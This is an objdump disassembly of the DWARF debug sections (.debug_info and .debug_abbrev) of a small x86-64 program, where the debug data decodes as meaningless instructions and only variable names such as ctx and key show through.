    1112:	45 00 01             	add    %r8b,(%r9)
    1115:	23 2d 00 00 00 03    	and    0x3000000(%rip),%ebp        # 300111b <_end+0x29f7f2b>
    111b:	91                   	xchg   %eax,%ecx
    111c:	e0 7e                	loopne 119c <_init-0x3ffbfc>
    111e:	00 0b                	add    %cl,(%rbx)
    1120:	08 ad 00 00 00 06    	or     %ch,0x6000000(%rbp)
    1126:	2d 00 00 00 a0       	sub    $0xa0000000,%eax
    112b:	01 00                	add    %eax,(%rax)
    112d:	00 07                	add    %al,(%rdi)
    112f:	34 00                	xor    $0x0,%al
    1131:	00 00                	add    %al,(%rax)
    1133:	0f 00 0f             	str    (%rdi)
    1136:	6f                   	outsl  %ds:(%rsi),(%dx)
    1137:	06                   	(bad)  
    1138:	00 00                	add    %al,(%rax)
    113a:	01 bd ee 71 40 00    	add    %edi,0x4071ee(%rbp)
    1140:	00 00                	add    %al,(%rax)
    1142:	00 00                	add    %al,(%rax)
    1144:	3e 01 00             	add    %eax,%ds:(%rax)
    1147:	00 00                	add    %al,(%rax)
    1149:	00 00                	add    %al,(%rax)
    114b:	00 01                	add    %al,(%rcx)
    114d:	9c                   	pushfq 
    114e:	04 02                	add    $0x2,%al
    1150:	00 00                	add    %al,(%rax)
    1152:	0a 63 74             	or     0x74(%rbx),%ah
    1155:	78 00                	js     1157 <_init-0x3ffc41>
    1157:	01 bd eb 00 00 00    	add    %edi,0xeb(%rbp)
    115d:	02 91 58 0c 88 06    	add    0x6880c58(%rcx),%dl
    1163:	00 00                	add    %al,(%rax)
    1165:	01 bd 8a 01 00 00    	add    %edi,0x18a(%rbp)
    116b:	02 91 50 0c e2 03    	add    0x3e20c50(%rcx),%dl
    1171:	00 00                	add    %al,(%rax)
    1173:	01 bd 2d 00 00 00    	add    %edi,0x2d(%rbp)
    1179:	02 91 48 0d 51 06    	add    0x6510d48(%rcx),%dl
    117f:	00 00                	add    %al,(%rax)
    1181:	01 bf 2d 00 00 00    	add    %edi,0x2d(%rdi)
    1187:	02 91 60 0d 8e 06    	add    0x68e0d60(%rcx),%dl
    118d:	00 00                	add    %al,(%rax)
    118f:	01 bf 2d 00 00 00    	add    %edi,0x2d(%rdi)
    1195:	02 91 68 00 0f 56    	add    0x560f0068(%rcx),%dl
    119b:	06                   	(bad)  
    119c:	00 00                	add    %al,(%rax)
    119e:	01 ec                	add    %ebp,%esp
    11a0:	2c 73                	sub    $0x73,%al
    11a2:	40 00 00             	add    %al,(%rax)
    11a5:	00 00                	add    %al,(%rax)
    11a7:	00 b1 02 00 00 00    	add    %dh,0x2(%rcx)
    11ad:	00 00                	add    %al,(%rax)
    11af:	00 01                	add    %al,(%rcx)
    11b1:	9c                   	pushfq 
    11b2:	86 02                	xchg   %al,(%rdx)
    11b4:	00 00                	add    %al,(%rax)
    11b6:	0a 63 74             	or     0x74(%rbx),%ah
    11b9:	78 00                	js     11bb <_init-0x3ffbdd>
    11bb:	01 ec                	add    %ebp,%esp
    11bd:	eb 00                	jmp    11bf <_init-0x3ffbd9>
    11bf:	00 00                	add    %al,(%rax)
    11c1:	03 91 b8 7f 0c ba    	add    -0x45f38048(%rcx),%edx
    11c7:	06                   	(bad)  
    11c8:	00 00                	add    %al,(%rax)
    11ca:	01 ec                	add    %ebp,%esp
    11cc:	8a 01                	mov    (%rcx),%al
    11ce:	00 00                	add    %al,(%rax)
    11d0:	03 91 b0 7f 0d a9    	add    -0x56f28050(%rcx),%edx
    11d6:	06                   	(bad)  
    11d7:	00 00                	add    %al,(%rax)
    11d9:	01 ee                	add    %ebp,%esi
    11db:	2d 00 00 00 02       	sub    $0x2000000,%eax
    11e0:	91                   	xchg   %eax,%ecx
    11e1:	50                   	push   %rax
    11e2:	0d 9a 06 00 00       	or     $0x69a,%eax
    11e7:	01 ee                	add    %ebp,%esi
    11e9:	2d 00 00 00 02       	sub    $0x2000000,%eax
    11ee:	91                   	xchg   %eax,%ecx
    11ef:	58                   	pop    %rax
    11f0:	0d 9f 06 00 00       	or     $0x69f,%eax
    11f5:	01 ef                	add    %ebp,%edi
    11f7:	2d 00 00 00 02       	sub    $0x2000000,%eax
    11fc:	91                   	xchg   %eax,%ecx
    11fd:	40 0e                	rex (bad) 
    11ff:	6c                   	insb   (%dx),%es:(%rdi)
    1200:	6f                   	outsl  %ds:(%rsi),(%dx)
    1201:	77 00                	ja     1203 <_init-0x3ffb95>
    1203:	01 ef                	add    %ebp,%edi
    1205:	2d 00 00 00 02       	sub    $0x2000000,%eax
    120a:	91                   	xchg   %eax,%ecx
    120b:	48 0d 4a 06 00 00    	or     $0x64a,%rax
    1211:	01 f0                	add    %esi,%eax
    1213:	86 02                	xchg   %al,(%rdx)
    1215:	00 00                	add    %al,(%rax)
    1217:	02 91 60 00 06 ad    	add    -0x52f9ffa0(%rcx),%dl
    121d:	00 00                	add    %al,(%rax)
    121f:	00 96 02 00 00 07    	add    %dl,0x7000002(%rsi)
    1225:	34 00                	xor    $0x0,%al
    1227:	00 00                	add    %al,(%rax)
    1229:	07                   	(bad)  
    122a:	00 0d 62 06 00 00    	add    %cl,0x662(%rip)        # 1892 <_init-0x3ff506>
    1230:	01 e4                	add    %esp,%esp
    1232:	9d                   	popfq  
    1233:	00 00                	add    %al,(%rax)
    1235:	00 09                	add    %cl,(%rcx)
    1237:	03 a0 91 60 00 00    	add    0x6091(%rax),%esp
    123d:	00 00                	add    %al,(%rax)
    123f:	00 00                	add    %al,(%rax)
    1241:	9b                   	fwait
    1242:	01 00                	add    %eax,(%rax)
    1244:	00 04 00             	add    %al,(%rax,%rax,1)
    1247:	b6 03                	mov    $0x3,%dh
    1249:	00 00                	add    %al,(%rax)
    124b:	08 01                	or     %al,(%rcx)
    124d:	b7 02                	mov    $0x2,%bh
    124f:	00 00                	add    %al,(%rax)
    1251:	01 c1                	add    %eax,%ecx
    1253:	06                   	(bad)  
    1254:	00 00                	add    %al,(%rax)
    1256:	a5                   	movsl  %ds:(%rsi),%es:(%rdi)
    1257:	04 00                	add    $0x0,%al
    1259:	00 dd                	add    %bl,%ch
    125b:	75 40                	jne    129d <_init-0x3ffafb>
    125d:	00 00                	add    %al,(%rax)
    125f:	00 00                	add    %al,(%rax)
    1261:	00 3f                	add    %bh,(%rdi)
    1263:	02 00                	add    (%rax),%al
    1265:	00 00                	add    %al,(%rax)
    1267:	00 00                	add    %al,(%rax)
    1269:	00 36                	add    %dh,(%rsi)
    126b:	07                   	(bad)  
    126c:	00 00                	add    %al,(%rax)
    126e:	02 ee                	add    %dh,%ch
    1270:	01 00                	add    %eax,(%rax)
    1272:	00 08                	add    %cl,(%rax)
    1274:	04 02                	add    $0x2,%al
    1276:	04 59                	add    $0x59,%al
    1278:	00 00                	add    %al,(%rax)
    127a:	00 03                	add    %al,(%rbx)
    127c:	78 00                	js     127e <_init-0x3ffb1a>
    127e:	02 06                	add    (%rsi),%al
    1280:	59                   	pop    %rcx
    1281:	00 00                	add    %al,(%rax)
    1283:	00 00                	add    %al,(%rax)
    1285:	03 79 00             	add    0x0(%rcx),%edi
    1288:	02 06                	add    (%rsi),%al
    128a:	59                   	pop    %rcx
    128b:	00 00                	add    %al,(%rax)
    128d:	00 04 03             	add    %al,(%rbx,%rax,1)
    1290:	6d                   	insl   (%dx),%es:(%rdi)
    1291:	00 02                	add    %al,(%rdx)
    1293:	06                   	(bad)  
    1294:	60                   	(bad)  
    1295:	00 00                	add    %al,(%rax)
    1297:	00 08                	add    %cl,(%rax)
    1299:	00 04 04             	add    %al,(%rsp,%rax,1)
    129c:	05 69 6e 74 00       	add    $0x746e69,%eax
    12a1:	05 59 00 00 00       	add    $0x59,%eax
    12a6:	70 00                	jo     12a8 <_init-0x3ffaf0>
    12a8:	00 00                	add    %al,(%rax)
    12aa:	06                   	(bad)  
    12ab:	70 00                	jo     12ad <_init-0x3ffaeb>
    12ad:	00 00                	add    %al,(%rax)
    12af:	ff 00                	incl   (%rax)
    12b1:	07                   	(bad)  
    12b2:	08 07                	or     %al,(%rdi)
    12b4:	92                   	xchg   %eax,%edx
    12b5:	02 00                	add    (%rax),%al
    12b7:	00 08                	add    %cl,(%rax)
    12b9:	c7 06 00 00 01 03    	movl   $0x3010000,(%rsi)
    12bf:	dd 75 40             	fnsave 0x40(%rbp)
    12c2:	00 00                	add    %al,(%rax)
    12c4:	00 00                	add    %al,(%rax)
    12c6:	00 1f                	add    %bl,(%rdi)
    12c8:	01 00                	add    %eax,(%rax)
    12ca:	00 00                	add    %al,(%rax)
    12cc:	00 00                	add    %al,(%rax)
    12ce:	00 01                	add    %al,(%rcx)
    12d0:	9c                   	pushfq 
    12d1:	fa                   	cli    
    12d2:	00 00                	add    %al,(%rax)
    12d4:	00 09                	add    %cl,(%rcx)
    12d6:	73 00                	jae    12d8 <_init-0x3ffac0>
    12d8:	01 03                	add    %eax,(%rbx)
    12da:	fa                   	cli    
    12db:	00 00                	add    %al,(%rax)
    12dd:	00 02                	add    %al,(%rdx)
    12df:	91                   	xchg   %eax,%ecx
    12e0:	48 09 6b 65          	or     %rbp,0x65(%rbx)
    12e4:	79 00                	jns    12e6 <_init-0x3ffab2>
    12e6:	01 03                	add    %eax,(%rbx)
    12e8:	00 01                	add    %al,(%rcx)
    12ea:	00 00                	add    %al,(%rax)
    12ec:	02 91 40 0a e2 03    	add    0x3e20a40(%rcx),%dl
    12f2:	00 00                	add    %al,(%rax)
    12f4:	01 03                	add    %eax,(%rbx)
    12f6:	59                   	pop    %rcx
    12f7:	00 00                	add    %al,(%rax)
    12f9:	00 03                	add    %al,(%rbx)
    12fb:	91                   	xchg   %eax,%ecx
    12fc:	bc 7f 0b 69 00       	mov    $0x690b7f,%esp
    1301:	01 05 59 00 00 00    	add    %eax,0x59(%rip)        # 1360 <_init-0x3ffa38>
    1307:	02 91 58 0b 6a 00    	add    0x6a0b58(%rcx),%dl
    130d:	01 05 59 00 00 00    	add    %eax,0x59(%rip)        # 136c <_init-0x3ffa2c>
    1313:	02 91 5c 0b 6b 00    	add    0x6b0b5c(%rcx),%dl
    1319:	01 05 59 00 00 00    	add    %eax,0x59(%rip)        # 1378 <_init-0x3ffa20>
    131f:	02 91 60 0b 6d 00    	add    0x6d0b60(%rcx),%dl
    1325:	01 05 0d 01 00 00    	add    %eax,0x10d(%rip)        # 1438 <_init-0x3ff960>
    132b:	02 91 68 0b 61 00    	add    0x610b68(%rcx),%dl
    1331:	01 05 59 00 00 00    	add    %eax,0x59(%rip)        # 1390 <_init-0x3ffa08>
    1337:	02 91 64 00 0c 08    	add    0x80c0064(%rcx),%dl
    133d:	2d 00 00 00 0c       	sub    $0xc000000,%eax
    1342:	08 06                	or     %al,(%rsi)
    1344:	01 00                	add    %eax,(%rax)
    1346:	00 07                	add    %al,(%rdi)
    1348:	01 08                	add    %ecx,(%rax)
    134a:	75 03                	jne    134f <_init-0x3ffa49>
    134c:	00 00                	add    %al,(%rax)
    134e:	0c 08                	or     $0x8,%al
    1350:	59                   	pop    %rcx
    1351:	00 00                	add    %al,(%rax)
    1353:	00 0d d1 06 00 00    	add    %cl,0x6d1(%rip)        # 1a2a <_init-0x3ff36e>
    1359:	01 1b                	add    %ebx,(%rbx)
    135b:	fc                   	cld    
    135c:	76 40                	jbe    139e <_init-0x3ff9fa>
    135e:	00 00                	add    %al,(%rax)
    1360:	00 00                	add    %al,(%rax)
    1362:	00 20                	add    %ah,(%rax)
    1364:	01 00                	add    %eax,(%rax)
    1366:	00 00                	add    %al,(%rax)
    1368:	00 00                	add    %al,(%rax)
    136a:	00 01                	add    %al,(%rcx)
    136c:	9c                   	pushfq 
    136d:	09 73 00             	or     %esi,0x0(%rbx)
    1370:	01 1b                	add    %ebx,(%rbx)
    1372:	fa                   	cli    
    1373:	00 00                	add    %al,(%rax)
    1375:	00 02                	add    %al,(%rdx)
    1377:	91                   	xchg   %eax,%ecx
    1378:	48 0a 1d 05 00 00 01 	rex.W or 0x1000005(%rip),%bl        # 1001384 <_end+0x9f8194>
    137f:	1b 00                	sbb    (%rax),%eax
    1381:	01 00                	add    %eax,(%rax)
    1383:	00 02                	add    %al,(%rdx)
    1385:	91                   	xchg   %eax,%ecx
    1386:	40 0a e2             	or     %dl,%spl
    1389:	03 00                	add    (%rax),%eax
    138b:	00 01                	add    %al,(%rcx)
    138d:	1b 59 00             	sbb    0x0(%rcx),%ebx
    1390:	00 00                	add    %al,(%rax)
    1392:	03 91 bc 7f 0b 69    	add    0x690b7fbc(%rcx),%edx
    1398:	00 01                	add    %al,(%rcx)
    139a:	1d 59 00 00 00       	sbb    $0x59,%eax
    139f:	02 91 54 0b 78 00    	add    0x780b54(%rcx),%dl
    13a5:	01 1d 59 00 00 00    	add    %ebx,0x59(%rip)        # 1404 <_init-0x3ff994>
    13ab:	02 91 58 0b 79 00    	add    0x790b58(%rcx),%dl
    13b1:	01 1d 59 00 00 00    	add    %ebx,0x59(%rip)        # 1410 <_init-0x3ff988>
    13b7:	02 91 5c 0b 6d 00    	add    0x6d0b5c(%rcx),%dl
    13bd:	01 1d 0d 01 00 00    	add    %ebx,0x10d(%rip)        # 14d0 <_init-0x3ff8c8>
    13c3:	02 91 68 0b 61 00    	add    0x610b68(%rcx),%dl
    13c9:	01 1d 59 00 00 00    	add    %ebx,0x59(%rip)        # 1428 <_init-0x3ff970>
    13cf:	02 91 60 0b 62 00    	add    0x620b60(%rcx),%dl
    13d5:	01 1d 59 00 00 00    	add    %ebx,0x59(%rip)        # 1434 <_init-0x3ff964>
    13db:	02                   	.byte 0x2
    13dc:	91                   	xchg   %eax,%ecx
    13dd:	64 00 00             	add    %al,%fs:(%rax)

Disassembly of section .debug_abbrev:

0000000000000000 <.debug_abbrev>:
   0:	01 11                	add    %edx,(%rcx)
   2:	01 25 0e 13 0b 03    	add    %esp,0x30b130e(%rip)        # 30b1316 <_end+0x2aa8126>
   8:	0e                   	(bad)  
   9:	1b 0e                	sbb    (%rsi),%ecx
   b:	11 01                	adc    %eax,(%rcx)
   d:	12 07                	adc    (%rdi),%al
   f:	10 17                	adc    %dl,(%rdi)
  11:	00 00                	add    %al,(%rax)
  13:	02 24 00             	add    (%rax,%rax,1),%ah
  16:	0b 0b                	or     (%rbx),%ecx
  18:	3e 0b 03             	or     %ds:(%rbx),%eax
  1b:	0e                   	(bad)  
  1c:	00 00                	add    %al,(%rax)
  1e:	03 24 00             	add    (%rax,%rax,1),%esp
  21:	0b 0b                	or     (%rbx),%ecx
  23:	3e 0b 03             	or     %ds:(%rbx),%eax
  26:	08 00                	or     %al,(%rax)
  28:	00 04 16             	add    %al,(%rsi,%rdx,1)
  2b:	00 03                	add    %al,(%rbx)
  2d:	0e                   	(bad)  
  2e:	3a 0b                	cmp    (%rbx),%cl
  30:	3b 0b                	cmp    (%rbx),%ecx
  32:	49 13 00             	adc    (%r8),%rax
  35:	00 05 0f 00 0b 0b    	add    %al,0xb0b000f(%rip)        # b0b004a <_end+0xaaa6e5a>
  3b:	49 13 00             	adc    (%r8),%rax
  3e:	00 06                	add    %al,(%rsi)
  40:	13 01                	adc    (%rcx),%eax
  42:	03 0e                	add    (%rsi),%ecx
  44:	0b 0b                	or     (%rbx),%ecx
  46:	3a 0b                	cmp    (%rbx),%cl
  48:	3b 0b                	cmp    (%rbx),%ecx
  4a:	01 13                	add    %edx,(%rbx)
  4c:	00 00                	add    %al,(%rax)
  4e:	07                   	(bad)  
  4f:	0d 00 03 0e 3a       	or     $0x3a0e0300,%eax
  54:	0b 3b                	or     (%rbx),%edi
  56:	0b 49 13             	or     0x13(%rcx),%ecx
  59:	38 0b                	cmp    %cl,(%rbx)
  5b:	00 00                	add    %al,(%rax)
  5d:	08 13                	or     %dl,(%rbx)
  5f:	01 0b                	add    %ecx,(%rbx)
  61:	0b 3a                	or     (%rdx),%edi
  63:	0b 3b                	or     (%rbx),%edi
  65:	0b 01                	or     (%rcx),%eax
  67:	13 00                	adc    (%rax),%eax
  69:	00 09                	add    %cl,(%rcx)
  6b:	01 01                	add    %eax,(%rcx)
  6d:	49 13 01             	adc    (%r9),%rax
  70:	13 00                	adc    (%rax),%eax
  72:	00 0a                	add    %cl,(%rdx)
  74:	21 00                	and    %eax,(%rax)
  76:	49 13 2f             	adc    (%r15),%rbp
  79:	0b 00                	or     (%rax),%eax
  7b:	00 0b                	add    %cl,(%rbx)
  7d:	04 01                	add    $0x1,%al
  7f:	03 0e                	add    (%rsi),%ecx
  81:	0b 0b                	or     (%rbx),%ecx
  83:	3a 0b                	cmp    (%rbx),%cl
  85:	3b 0b                	cmp    (%rbx),%ecx
  87:	01 13                	add    %edx,(%rbx)
  89:	00 00                	add    %al,(%rax)
  8b:	0c 28                	or     $0x28,%al
  8d:	00 03                	add    %al,(%rbx)
  8f:	0e                   	(bad)  
  90:	1c 0d                	sbb    $0xd,%al
  92:	00 00                	add    %al,(%rax)
  94:	0d 04 01 0b 0b       	or     $0xb0b0104,%eax
  99:	3a 0b                	cmp    (%rbx),%cl
  9b:	3b 0b                	cmp    (%rbx),%ecx
  9d:	01 13                	add    %edx,(%rbx)
  9f:	00 00                	add    %al,(%rax)
  a1:	0e                   	(bad)  
  a2:	13 01                	adc    (%rcx),%eax
  a4:	03 0e                	add    (%rsi),%ecx
  a6:	0b 05 3a 0b 3b 0b    	or     0xb3b0b3a(%rip),%eax        # b3b0be6 <_end+0xada79f6>
  ac:	01 13                	add    %edx,(%rbx)
  ae:	00 00                	add    %al,(%rax)
  b0:	0f 0d 00             	prefetch (%rax)
  b3:	03 08                	add    (%rax),%ecx
  b5:	3a 0b                	cmp    (%rbx),%cl
  b7:	3b 0b                	cmp    (%rbx),%ecx
  b9:	49 13 38             	adc    (%r8),%rdi
  bc:	0b 00                	or     (%rax),%eax
  be:	00 10                	add    %dl,(%rax)
  c0:	13 01                	adc    (%rcx),%eax
  c2:	0b 05 3a 0b 3b 0b    	or     0xb3b0b3a(%rip),%eax        # b3b0c02 <_end+0xada7a12>
  c8:	01 13                	add    %edx,(%rbx)
  ca:	00 00                	add    %al,(%rax)
  cc:	11 21                	adc    %esp,(%rcx)
  ce:	00 49 13             	add    %cl,0x13(%rcx)
  d1:	2f                   	(bad)  
  d2:	05 00 00 12 2e       	add    $0x2e120000,%eax
  d7:	01 3f                	add    %edi,(%rdi)
  d9:	19 03                	sbb    %eax,(%rbx)
  db:	0e                   	(bad)  
  dc:	3a 0b                	cmp    (%rbx),%cl
  de:	3b 0b                	cmp    (%rbx),%ecx
  e0:	27                   	(bad)  
  e1:	19 11                	sbb    %edx,(%rcx)
  e3:	01 12                	add    %edx,(%rdx)
  e5:	07                   	(bad)  
  e6:	40 18 96 42 19 01 13 	sbb    %dl,0x13011942(%rsi)
  ed:	00 00                	add    %al,(%rax)
  ef:	13 05 00 03 0e 3a    	adc    0x3a0e0300(%rip),%eax        # 3a0e03f5 <_end+0x39ad7205>
  f5:	0b 3b                	or     (%rbx),%edi
  f7:	0b 49 13             	or     0x13(%rcx),%ecx
  fa:	02 18                	add    (%rax),%bl
  fc:	00 00                	add    %al,(%rax)
  fe:	14 2e                	adc    $0x2e,%al
 100:	01 03                	add    %eax,(%rbx)
 102:	0e                   	(bad)  
 103:	3a 0b                	cmp    (%rbx),%cl
 105:	3b 0b                	cmp    (%rbx),%ecx
 107:	27                   	(bad)  
 108:	19 49 13             	sbb    %ecx,0x13(%rcx)
 10b:	11 01                	adc    %eax,(%rcx)
 10d:	12 07                	adc    (%rdi),%al
 10f:	40 18 96 42 19 01 13 	sbb    %dl,0x13011942(%rsi)
 116:	00 00                	add    %al,(%rax)
 118:	15 05 00 03 08       	adc    $0x8030005,%eax
 11d:	3a 0b                	cmp    (%rbx),%cl
 11f:	3b 0b                	cmp    (%rbx),%ecx
 121:	49 13 02             	adc    (%r10),%rax
 124:	18 00                	sbb    %al,(%rax)
 126:	00 16                	add    %dl,(%rsi)
 128:	34 00                	xor    $0x0,%al
 12a:	03 0e                	add    (%rsi),%ecx
 12c:	3a 0b                	cmp    (%rbx),%cl
 12e:	3b 0b                	cmp    (%rbx),%ecx
 130:	49 13 02             	adc    (%r10),%rax
 133:	18 00                	sbb    %al,(%rax)
 135:	00 17                	add    %dl,(%rdi)
 137:	34 00                	xor    $0x0,%al
 139:	03 08                	add    (%rax),%ecx
 13b:	3a 0b                	cmp    (%rbx),%cl
 13d:	3b 0b                	cmp    (%rbx),%ecx
 13f:	49 13 02             	adc    (%r10),%rax
 142:	18 00                	sbb    %al,(%rax)
 144:	00 18                	add    %bl,(%rax)
 146:	34 00                	xor    $0x0,%al
 148:	03 0e                	add    (%rsi),%ecx
 14a:	49 13 34 19          	adc    (%r9,%rbx,1),%rsi
 14e:	02 18                	add    (%rax),%bl
 150:	00 00                	add    %al,(%rax)
 152:	19 0b                	sbb    %ecx,(%rbx)
 154:	01 11                	add    %edx,(%rcx)
 156:	01 12                	add    %edx,(%rdx)
 158:	07                   	(bad)  
 159:	00 00                	add    %al,(%rax)
 15b:	1a 26                	sbb    (%rsi),%ah
 15d:	00 49 13             	add    %cl,0x13(%rcx)
 160:	00 00                	add    %al,(%rax)
 162:	1b 2e                	sbb    (%rsi),%ebp
 164:	01 03                	add    %eax,(%rbx)
 166:	0e                   	(bad)  
 167:	3a 0b                	cmp    (%rbx),%cl
 169:	3b 0b                	cmp    (%rbx),%ecx
 16b:	27                   	(bad)  
 16c:	19 11                	sbb    %edx,(%rcx)
 16e:	01 12                	add    %edx,(%rdx)
 170:	07                   	(bad)  
 171:	40 18 96 42 19 01 13 	sbb    %dl,0x13011942(%rsi)
 178:	00 00                	add    %al,(%rax)
 17a:	1c 0a                	sbb    $0xa,%al
 17c:	00 03                	add    %al,(%rbx)
 17e:	0e                   	(bad)  
 17f:	3a 0b                	cmp    (%rbx),%cl
 181:	3b 0b                	cmp    (%rbx),%ecx
 183:	11 01                	adc    %eax,(%rcx)
 185:	00 00                	add    %al,(%rax)
 187:	1d 2e 01 3f 19       	sbb    $0x193f012e,%eax
 18c:	03 0e                	add    (%rsi),%ecx
 18e:	3a 0b                	cmp    (%rbx),%cl
 190:	3b 05 27 19 49 13    	cmp    0x13491927(%rip),%eax        # 13491abd <_end+0x12e888cd>
 196:	11 01                	adc    %eax,(%rcx)
 198:	12 07                	adc    (%rdi),%al
 19a:	40 18 96 42 19 01 13 	sbb    %dl,0x13011942(%rsi)
 1a1:	00 00                	add    %al,(%rax)
 1a3:	1e                   	(bad)  
 1a4:	05 00 03 0e 3a       	add    $0x3a0e0300,%eax
 1a9:	0b 3b                	or     (%rbx),%edi
 1ab:	05 49 13 02 18       	add    $0x18021349,%eax
 1b0:	00 00                	add    %al,(%rax)
 1b2:	1f                   	(bad)  
 1b3:	34 00                	xor    $0x0,%al
 1b5:	03 0e                	add    (%rsi),%ecx
 1b7:	3a 0b                	cmp    (%rbx),%cl
 1b9:	3b 05 49 13 02 18    	cmp    0x18021349(%rip),%eax        # 18021508 <_end+0x17a18318>
 1bf:	00 00                	add    %al,(%rax)
 1c1:	20 34 00             	and    %dh,(%rax,%rax,1)
 1c4:	03 08                	add    (%rax),%ecx
 1c6:	3a 0b                	cmp    (%rbx),%cl
 1c8:	3b 05 49 13 02 18    	cmp    0x18021349(%rip),%eax        # 18021517 <_end+0x17a18327>
 1ce:	00 00                	add    %al,(%rax)
 1d0:	21 0a                	and    %ecx,(%rdx)
 1d2:	00 03                	add    %al,(%rbx)
 1d4:	0e                   	(bad)  
 1d5:	3a 0b                	cmp    (%rbx),%cl
 1d7:	3b 05 11 01 00 00    	cmp    0x111(%rip),%eax        # 2ee <_init-0x400aaa>
 1dd:	22 0b                	and    (%rbx),%cl
 1df:	01 11                	add    %edx,(%rcx)
 1e1:	01 12                	add    %edx,(%rdx)
 1e3:	07                   	(bad)  
 1e4:	01 13                	add    %edx,(%rbx)
 1e6:	00 00                	add    %al,(%rax)
 1e8:	23 34 00             	and    (%rax,%rax,1),%esi
 1eb:	03 0e                	add    (%rsi),%ecx
 1ed:	3a 0b                	cmp    (%rbx),%cl
 1ef:	3b 0b                	cmp    (%rbx),%ecx
 1f1:	49 13 3f             	adc    (%r15),%rdi
 1f4:	19 02                	sbb    %eax,(%rdx)
 1f6:	18 00                	sbb    %al,(%rax)
 1f8:	00 00                	add    %al,(%rax)
 1fa:	01 11                	add    %edx,(%rcx)
 1fc:	01 25 0e 13 0b 03    	add    %esp,0x30b130e(%rip)        # 30b1510 <_end+0x2aa8320>
 202:	0e                   	(bad)  
 203:	1b 0e                	sbb    (%rsi),%ecx
 205:	11 01                	adc    %eax,(%rcx)
 207:	12 07                	adc    (%rdi),%al
 209:	10 17                	adc    %dl,(%rdi)
 20b:	00 00                	add    %al,(%rax)
 20d:	02 16                	add    (%rsi),%dl
 20f:	00 03                	add    %al,(%rbx)
 211:	0e                   	(bad)  
 212:	3a 0b                	cmp    (%rbx),%cl
 214:	3b 0b                	cmp    (%rbx),%ecx
 216:	49 13 00             	adc    (%r8),%rax
 219:	00 03                	add    %al,(%rbx)
 21b:	24 00                	and    $0x0,%al
 21d:	0b 0b                	or     (%rbx),%ecx
 21f:	3e 0b 03             	or     %ds:(%rbx),%eax
 222:	0e                   	(bad)  
 223:	00 00                	add    %al,(%rax)
 225:	04 24                	add    $0x24,%al
 227:	00 0b                	add    %cl,(%rbx)
 229:	0b 3e                	or     (%rsi),%edi
 22b:	0b 03                	or     (%rbx),%eax
 22d:	08 00                	or     %al,(%rax)
 22f:	00 05 0f 00 0b 0b    	add    %al,0xb0b000f(%rip)        # b0b0244 <_end+0xaaa7054>
 235:	49 13 00             	adc    (%r8),%rax
 238:	00 06                	add    %al,(%rsi)
 23a:	26 00 49 13          	add    %cl,%es:0x13(%rcx)
 23e:	00 00                	add    %al,(%rax)
 240:	07                   	(bad)  
 241:	13 01                	adc    (%rcx),%eax
 243:	03 08                	add    (%rax),%ecx
 245:	0b 0b                	or     (%rbx),%ecx
 247:	3a 0b                	cmp    (%rbx),%cl
 249:	3b 0b                	cmp    (%rbx),%ecx
 24b:	01 13                	add    %edx,(%rbx)
 24d:	00 00                	add    %al,(%rax)
 24f:	08 0d 00 03 0e 3a    	or     %cl,0x3a0e0300(%rip)        # 3a0e0555 <_end+0x39ad7365>
 255:	0b 3b                	or     (%rbx),%edi
 257:	0b 49 13             	or     0x13(%rcx),%ecx
 25a:	38 0b                	cmp    %cl,(%rbx)
 25c:	00 00                	add    %al,(%rax)
 25e:	09 2e                	or     %ebp,(%rsi)
 260:	01 3f                	add    %edi,(%rdi)
 262:	19 03                	sbb    %eax,(%rbx)
 264:	0e                   	(bad)  
 265:	3a 0b                	cmp    (%rbx),%cl
 267:	3b 0b                	cmp    (%rbx),%ecx
 269:	27                   	(bad)  
 26a:	19 11                	sbb    %edx,(%rcx)
 26c:	01 12                	add    %edx,(%rdx)
 26e:	07                   	(bad)  
 26f:	40 18 96 42 19 01 13 	sbb    %dl,0x13011942(%rsi)
 276:	00 00                	add    %al,(%rax)
 278:	0a 05 00 03 08 3a    	or     0x3a080300(%rip),%al        # 3a08057e <_end+0x39a7738e>
 27e:	0b 3b                	or     (%rbx),%edi
 280:	0b 49 13             	or     0x13(%rcx),%ecx
 283:	02 18                	add    (%rax),%bl
 285:	00 00                	add    %al,(%rax)
 287:	0b 34 00             	or     (%rax,%rax,1),%esi
 28a:	03 08                	add    (%rax),%ecx
 28c:	3a 0b                	cmp    (%rbx),%cl
 28e:	3b 0b                	cmp    (%rbx),%ecx
 290:	49 13 02             	adc    (%r10),%rax
 293:	18 00                	sbb    %al,(%rax)
 295:	00 0c 34             	add    %cl,(%rsp,%rsi,1)
 298:	00 03                	add    %al,(%rbx)
 29a:	0e                   	(bad)  
 29b:	3a 0b                	cmp    (%rbx),%cl
 29d:	3b 0b                	cmp    (%rbx),%ecx
 29f:	49 13 02             	adc    (%r10),%rax
 2a2:	18 00                	sbb    %al,(%rax)
 2a4:	00 0d 2e 01 3f 19    	add    %cl,0x193f012e(%rip)        # 193f03d8 <_end+0x18de71e8>
 2aa:	03 0e                	add    (%rsi),%ecx
 2ac:	3a 0b                	cmp    (%rbx),%cl
 2ae:	3b 0b                	cmp    (%rbx),%ecx
 2b0:	27                   	(bad)  
 2b1:	19 11                	sbb    %edx,(%rcx)
 2b3:	01 12                	add    %edx,(%rdx)
 2b5:	07                   	(bad)  
 2b6:	40 18 97 42 19 01 13 	sbb    %dl,0x13011942(%rdi)
 2bd:	00 00                	add    %al,(%rax)
 2bf:	0e                   	(bad)  
 2c0:	2e 01 3f             	add    %edi,%cs:(%rdi)
 2c3:	19 03                	sbb    %eax,(%rbx)
 2c5:	0e                   	(bad)  
 2c6:	3a 0b                	cmp    (%rbx),%cl
 2c8:	3b 0b                	cmp    (%rbx),%ecx
 2ca:	27                   	(bad)  
 2cb:	19 11                	sbb    %edx,(%rcx)
 2cd:	01 12                	add    %edx,(%rdx)
 2cf:	07                   	(bad)  
 2d0:	40 18 97 42 19 00 00 	sbb    %dl,0x1942(%rdi)
 2d7:	00 01                	add    %al,(%rcx)
 2d9:	11 01                	adc    %eax,(%rcx)
 2db:	25 0e 13 0b 03       	and    $0x30b130e,%eax
 2e0:	0e                   	(bad)  
 2e1:	1b 0e                	sbb    (%rsi),%ecx
 2e3:	11 01                	adc    %eax,(%rcx)
 2e5:	12 07                	adc    (%rdi),%al
 2e7:	10 17                	adc    %dl,(%rdi)
 2e9:	00 00                	add    %al,(%rax)
 2eb:	02 24 00             	add    (%rax,%rax,1),%ah
 2ee:	0b 0b                	or     (%rbx),%ecx
 2f0:	3e 0b 03             	or     %ds:(%rbx),%eax
 2f3:	0e                   	(bad)  
 2f4:	00 00                	add    %al,(%rax)
 2f6:	03 24 00             	add    (%rax,%rax,1),%esp
